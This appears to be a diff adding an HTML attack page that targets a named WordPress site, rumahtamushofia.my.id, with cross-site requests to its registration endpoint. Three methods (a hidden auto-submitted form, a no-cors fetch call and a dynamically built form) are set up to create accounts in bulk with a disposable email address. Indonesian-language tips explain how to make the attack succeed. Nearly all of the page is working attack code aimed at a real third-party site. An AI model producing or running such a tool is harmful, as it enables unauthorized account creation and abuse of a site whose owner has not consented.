@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Mass User Creation Test - FIXED</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 25px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        }
+        .user-section {
+            border: 2px solid rgba(255,255,255,0.3);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.05);
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: #ff5252;
+            transform: translateY(-2px);
+        }
+        .btn-success {
+            background: #51cf66;
+        }
+        .btn-success:hover {
+            background: #40c057;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            border-left: 4px solid #74c0fc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 CSRF Mass User Creation - FIXED</h1>
+        <p style="text-align: center;"><strong>Target:</strong> https://rumahtamushofia.my.id</p>
+        
+        <div class="status" id="status">
+            🟢 Ready to test CSRF vulnerability...
+        </div>
+
+        <!-- METHOD 1: Standard Form Submission -->
+        <div class="user-section">
+            <h3>👤 Method 1: Standard CSRF</h3>
+            <form id="user1" action="https://rumahtamushofia.my.id/wp-login.php?action=register" method="POST" target="_blank">
+                <input type="text" name="user_login" value="csrf_test_001" style="display: none;">
+                <input type="email" name="user_email" value="dfpbosevhidmpjtlsb@fxavaj.com" style="display: none;">
+                <input type="hidden" name="wp-submit" value="Register">
+            </form>
+            <button onclick="createUser(1)">🚀 Create User 1 (New Tab)</button>
+        </div>
+
+        <!-- METHOD 2: JavaScript Fetch API -->
+        <div class="user-section">
+            <h3>👤 Method 2: Fetch API</h3>
+            <button onclick="createUserFetch('csrf_test_002', 'dfpbosevhidmpjtlsb@fxavaj.com')">
+                🚀 Create User 2 (Fetch API)
+            </button>
+        </div>
+
+        <!-- METHOD 3: Dynamic Form Creation -->
+        <div class="user-section">
+            <h3>👤 Method 3: Dynamic Form</h3>
+            <button onclick="createDynamicForm('csrf_test_003', 'dfpbosevhidmpjtlsb@fxavaj.com')">
+                🚀 Create User 3 (Dynamic)
+            </button>
+        </div>
+
+        <div class="status">
+            <strong>🔧 Jika masih gagal, coba ini:</strong>
+            <ol>
+                <li>Ganti email values dengan email temporary ASLI</li>
+                <li>Coba Method 2 (Fetch API) - lebih reliable</li>
+                <li>Pastikan tidak ada ad-blocker yang aktif</li>
+                <li>Coba di browser berbeda (Chrome/Firefox)</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
+            console.log("CSRF: " + message);
+        }
+
+        // Method 1: Standard Form
+        function createUser(userNumber) {
+            updateStatus("🚀 Opening registration in new tab...");
+            document.getElementById(`user${userNumber}`).submit();
+        }
+
+        // Method 2: Fetch API (More Reliable)
+        function createUserFetch(username, email) {
+            updateStatus(`🚀 Creating ${username} via Fetch API...`);
+            
+            const formData = new URLSearchParams();
+            formData.append('user_login', username);
+            formData.append('user_email', email);
+            formData.append('wp-submit', 'Register');
+
+            fetch('https://rumahtamushofia.my.id/wp-login.php?action=register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: formData,
+                mode: 'no-cors'
+            })
+            .then(() => {
+                updateStatus(`✅ ${username} submitted! Check if user was created.`);
+            })
+            .catch(error => {
+                updateStatus(`❌ Error: ${error}`);
+            });
+        }
+
+        // Method 3: Dynamic Form Creation
+        function createDynamicForm(username, email) {
+            updateStatus(`🚀 Creating dynamic form for ${username}...`);
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://rumahtamushofia.my.id/wp-login.php?action=register';
+            form.target = '_blank';
+            form.style.display = 'none';
+
+            const usernameInput = document.createElement('input');
+            usernameInput.type = 'text';
+            usernameInput.name = 'user_login';
+            usernameInput.value = username;
+
+            const emailInput = document.createElement('input');
+            emailInput.type = 'email';
+            emailInput.name = 'user_email';
+            emailInput.value = email;
+
+            const submitInput = document.createElement('input');
+            submitInput.type = 'hidden';
+            submitInput.name = 'wp-submit';
+            submitInput.value = 'Register';
+
+            form.appendChild(usernameInput);
+            form.appendChild(emailInput);
+            form.appendChild(submitInput);
+            document.body.appendChild(form);
+            
+            form.submit();
+            document.body.removeChild(form);
+            
+            updateStatus(`✅ ${username} submitted via dynamic form!`);
+        }
+
+        // Debug
+        console.log("🔴 CSRF Test Loaded - 3 Methods Available");
+    </script>
+</body>
+</html>
